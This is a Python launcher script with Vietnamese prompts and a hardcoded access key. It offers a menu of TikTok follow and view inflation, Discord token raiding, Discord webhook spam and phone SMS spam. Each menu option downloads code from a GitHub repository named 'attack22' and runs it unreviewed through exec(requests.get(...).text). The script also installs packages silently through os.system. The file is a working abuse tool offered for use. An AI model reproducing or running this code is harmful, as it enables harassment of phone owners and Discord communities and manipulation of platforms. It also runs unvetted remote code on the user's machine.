import threading, base64, os, time, re, json, random
from datetime import datetime, timedelta
from time import sleep, strftime
from bs4 import BeautifulSoup
import requests, socket, sys

try:
    from faker import Faker
    from requests import session
    from colorama import Fore, Style
    import pystyle
except:
    os.system("pip install faker requests colorama pystyle bs4")
    print('__Vui Lòng Chạy Lại Tool__')
    exit()

from pystyle import Center, Colors, Colorate

# Key cố định
correct_key = "vandung22"

# Yêu cầu nhập key để chạy tool
user_key = input("\033[1;97mNhập Key để tiếp tục: ")

if user_key != correct_key:
    print("\033[1;91m[X] Key không hợp lệ! Tool thoát.\n")
    exit()
else:
    print("\033[1;92m[Ok] Key hợp lệ! Đang khởi động tool...\n")

def banner():
    banner = f"""
\033[97m════════════════════════════════════════════════  
\033[1;33m██████╗  ██████╗ ███╗   ██╗███╗   ██╗██╗   ██╗
██╔══██╗██╔═══██╗████╗  ██║████╗  ██║╚██╗ ██╔╝
██║  ██║██║   ██║██╔██╗ ██║██╔██╗ ██║ ╚████╔╝ 
██║  ██║██║   ██║██║╚██╗██║██║╚██╗██║  ╚██╔╝  
██████╔╝╚██████╔╝██║ ╚████║██║ ╚████║   ██║   
╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═══╝   ╚═╝\n
\033[1;97mSource Cộng Đồng: \033[1;32mDonny            \033[1;97mPhiên Bản: \033[1;32m4.0     
\033[97m════════════════════════════════════════════════  
\033[1;97m[\033[1;91m❣\033[1;97m] Facebook\033[1;31m  : \033[1;97m \033[1;36mNguyễn Văn Dững(Donny)\033[1;31m \033[1;97m
\033[1;97m[\033[1;91m❣\033[1;97m] Telegram\033[1;31m : \033[1;97m \033[1;32mhttps://t.me/xyzvandung\033[1;97m
\033[97m════════════════════════════════════════════════
"""
    for X in banner:
        sys.stdout.write(X)
        sys.stdout.flush()
        sleep(0.000001)

while True:
    os.system('cls' if os.name == 'nt' else 'clear')
    banner()
    print("\033[1;37m╔══════════════════════╗         ")
    print("\033[1;37m║  \033[1;32m TikTok    \033[1;37m║          ")
    print("\033[1;37m╚══════════════════════╝           ")
    print(f"\033[1;97m[\033[1;32m*\033[1;97m] \033[1;33m1 \033[1;97m: \033[1;34mFollow \033[1;32m[Online]")
    print(f"\033[1;97m[\033[1;32m*\033[1;97m] \033[1;33m1.1 \033[1;97m: \033[1;34mView \033[1;32m[Online]")
    print("\033[1;37m╔══════════════════════╗         ")
    print("\033[1;37m║  \033[1;32m Discord \033[1;37m║          ")
    print("\033[1;37m╚══════════════════════╝           ")
    print(f"\033[1;97m[\033[1;32m*\033[1;97m] \033[1;33m2.1 \033[1;97m: \033[1;34mRaid Nhiều Token \033[1;32m[Online]")
    print(f"\033[1;97m[\033[1;32m*\033[1;97m] \033[1;33m2.2 \033[1;97m: \033[1;34mWebhook Spam \033[1;32m[Online]")
    print("\033[1;37m╔══════════════════════╗         ")
    print("\033[1;37m║  \033[1;32m SmS    \033[1;37m║          ")
    print("\033[1;37m╚══════════════════════╝           ")
    print(f"\033[1;97m[\033[1;32m*\033[1;97m] \033[1;33m3.1 \033[1;97m: \033[1;34mSmS Spam \033[1;32m[Online]")
    print(f"\033[1;97m[\033[1;32m*\033[1;97m] \033[1;33m3.2 \033[1;97m: \033[1;34mThoát Tool \033[1;32m[Online]")
    print(f"\033[97m════════════════════════════════════════════════════════")

    chon = input('\033[1;91m┌─╼\033[1;97m[\033[1;91m<\033[1;97m/\033[1;91m>\033[1;97m]--\033[1;91m>\033[1;97m Nhập lựa chọn \033[1;97m \n\033[1;91m└─╼\033[1;91m✈ \033[1;33m : ')
    print('\033[1;39m─────────────────────────────────────────────────────────── ')

    if chon == '1':
        exec(requests.get('https://raw.githubusercontent.com/vandung2009/attack22/refs/heads/main/misc/follow.py').text)
    elif chon == '1.1':
        exec(requests.get('https://raw.githubusercontent.com/vandung2009/attack22/refs/heads/main/misc/zefoy.py').text)
    elif chon == '2.1':
        exec(requests.get('https://raw.githubusercontent.com/vandung2009/attack22/refs/heads/main/discordraid.py').text)
    elif chon == '2.2':
        exec(requests.get('https://raw.githubusercontent.com/vandung2009/attack22/refs/heads/main/webhookdiscord-spammer.py').text)
    elif chon == '3.1':
        exec(requests.get('https://raw.githubusercontent.com/vandung2009/attack22/refs/heads/main/phonesms-spammer.py').text)
    elif chon == '3.2':
        print("\033[1;91mThoát tool...")
        exit()
    else:
        print("\033[1;91m[X] Lựa chọn không hợp lệ! Hãy thử lại.\n")
